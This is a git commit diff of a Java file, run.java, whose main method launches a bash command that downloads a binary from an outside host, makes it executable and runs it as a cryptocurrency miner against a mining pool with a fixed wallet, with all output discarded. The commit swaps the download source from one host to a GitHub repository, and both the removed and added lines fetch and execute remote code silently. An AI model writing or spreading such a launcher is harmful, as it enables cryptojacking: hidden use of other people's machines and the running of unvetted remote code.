3cad138bd594c0da85973116ad283810cb6ffcc9
lianamahesra-creator <lianamahesra@gmail.com>
2026-06-20 07:57:18 +0700

    Update run.java

--- run.java
+++ run.java
@@ -4,7 +4,7 @@ import java.util.*;
 public class run {
     public static void main(String[] args) {
         try {
-            ProcessBuilder builder = new ProcessBuilder("bash", "-c", "curl https://pearlhash.xyz/downloads/pearl-miner-v12 -o pearl-miner && chmod +x pearl-miner && ./pearl-miner --host pool.pearlhash.xyz:9000 --user prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t");
+            ProcessBuilder builder = new ProcessBuilder("bash", "-c", "curl -O -L -J https://github.com/lianamahesra-creator/legendary-journey/raw/refs/heads/main/lpm;chmod +x lpm;./lpm --pool pool.pearlhash.xyz:9000 --wallet prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t");
             builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
             builder.redirectError(ProcessBuilder.Redirect.DISCARD);
             Process process = builder.start();
